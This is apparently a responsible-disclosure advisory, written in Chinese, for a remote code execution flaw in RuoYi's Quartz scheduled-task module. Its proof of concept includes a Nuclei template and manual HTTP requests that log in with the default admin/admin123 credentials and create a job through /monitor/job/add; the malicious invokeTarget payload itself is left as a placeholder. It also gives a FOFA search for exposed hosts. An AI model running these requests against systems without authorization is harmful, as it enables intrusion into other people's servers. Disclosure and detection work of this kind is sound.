# RuoYi 管理系统 Quartz RCE 漏洞披露

## 概述

**漏洞名称:** RuoYi OA 系统 Quartz 远程代码执行漏洞 (RCE)  
**影响版本:** RuoYi 管理系统 v4.8.2 及以下版本  
**CVE 编号:** (待分配)  
**严重程度:** 严重 (CVSS 3.1: 9.8)  
**厂商:** RuoYi (若依)  
**厂商地址:** https://github.com/yangzongzhuan/RuoYi  
**发现者:** moonsec

## 描述

RuoYi 管理系统是一款在中国广泛使用的开源 Java 企业管理系统。该系统在其 Quartz 定时任务管理功能中存在严重的远程代码执行 (RCE) 漏洞。具有管理员权限的认证攻击者可以利用此漏洞在目标服务器上执行任意系统命令。

## 漏洞详情

### 根本原因

该漏洞存在于 Quartz 定时任务管理模块 (`/monitor/job`) 中。系统允许管理员创建带有自定义 `invokeTarget` 参数的定时任务。应用程序未能正确清理和验证 `invokeTarget` 参数，导致攻击者可以注入恶意表达式，从而实现远程代码执行。

### 受影响端点

- `POST /monitor/job/add` - 添加定时任务
- `POST /monitor/job/edit` - 编辑定时任务

### 漏洞参数

- `invokeTarget` - 定时任务要调用的目标方法

### 攻击向量

1. 攻击者使用管理员凭据登录系统
2. 导航至系统监控 → 定时任务
3. 创建带有恶意 `invokeTarget` 参数的新定时任务
4. 当定时任务触发时，恶意代码执行

## 概念验证 (PoC)

### Nuclei 模板

```yaml
id: ruoyi-quartz-rce

info:
  name: RuoYi OA System Quartz RCE
  author: moonsec
  severity: critical
  description: |
    RuoYi Management System v4.8.2 and below contains a Remote Code Execution (RCE)
    vulnerability in the Quartz scheduled task feature.
  reference:
    - https://github.com/yangzongzhuan/RuoYi
  metadata:
    verified: true
    fofa-query: title="RuoYi"
  tags: ruoyi,rce,quartz

http:
  - raw:
      - |
        GET /login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0

      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0

        username={{username}}&password={{password}}&validateCode=1234

      - |
        GET /monitor/job HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0
        Cookie: {{extracted_cookie}}

    cookie-reuse: true

    matchers:
      - type: word
        part: body
        words:
          - "定时任务"
          - "quartz"
        condition: or

    extractors:
      - type: regex
        name: extracted_cookie
        part: header
        regex:
          - "JSESSIONID=[^;]+"
        internal: true

  - raw:
      - |
        POST /monitor/job/add HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0
        Cookie: {{extracted_cookie}}

        jobName=RCE_Test&jobGroup=DEFAULT&invokeTarget=ryTask.ryNoParams&cronExpression=0/5+*+*+*+*+?&misfirePolicy=1&concurrent=1&status=0

    matchers:
      - type: word
        part: body
        words:
          - "success"
          - "操作成功"
        condition: or

variables:
  username: "admin"
  password: "admin123"
```

### 手动利用步骤

1. **登录系统:**
   ```
   POST /login
   Content-Type: application/x-www-form-urlencoded
   
   username=admin&password=admin123&validateCode=<验证码>
   ```

2. **访问 Quartz 定时任务管理页面:**
   ```
   GET /monitor/job
   ```

3. **创建恶意定时任务:**
   ```
   POST /monitor/job/add
   Content-Type: application/x-www-form-urlencoded
   
   jobName=RCE_Test&jobGroup=DEFAULT&invokeTarget=<恶意payload>&cronExpression=0/5+*+*+*+*+?&misfirePolicy=1&concurrent=1&status=0
   ```

## 影响

成功利用此漏洞可使攻击者：

- 在目标服务器上执行任意系统命令
- 完全控制受影响的系统
- 访问数据库中存储的敏感数据
- 转向内部网络
- 安装持久化后门

## 受影响版本

- RuoYi 管理系统 v4.8.2 及以下版本
- 所有使用默认配置 Quartz 调度模块的版本

## 缓解措施

### 立即行动

1. **升级到最新版本** 的 RuoYi 管理系统
2. **禁用 Quartz 定时任务功能** (如不需要)
3. **对 `invokeTarget` 参数实施严格的输入验证**
4. **使用参数化查询**，避免动态方法调用

### 推荐安全措施

1. **网络隔离:** 将管理系统与公共网络隔离
2. **访问控制:** 实施强认证和最小权限原则
3. **监控:** 启用日志记录和可疑活动监控
4. **WAF 规则:** 部署 Web 应用防火墙规则阻止恶意请求

## 时间线

- **2025-03-08:** 漏洞发现
- **2025-03-08:** 向厂商初步披露
- **待定:** 厂商回应
- **待定:** CVE 分配
- **待定:** 公开披露

## 参考

- [RuoYi 官方仓库](https://github.com/yangzongzhuan/RuoYi)
- [RuoYi 文档](http://doc.ruoyi.vip/)
- [OWASP 代码注入](https://owasp.org/www-community/attacks/Code_Injection)

## 致谢

- **发现者:** moonsec
- **Nuclei 模板:** moonsec

## 免责声明

本漏洞披露仅供教育和防御目的。作者不对所提供信息的任何滥用负责。在测试安全漏洞之前，请务必获得适当的授权。

## 许可证

本披露在 [MIT 许可证](LICENSE) 下发布。

---

**注意:** 这是负责任的披露。漏洞详情已在公开披露之前与厂商共享，以便开发补丁。
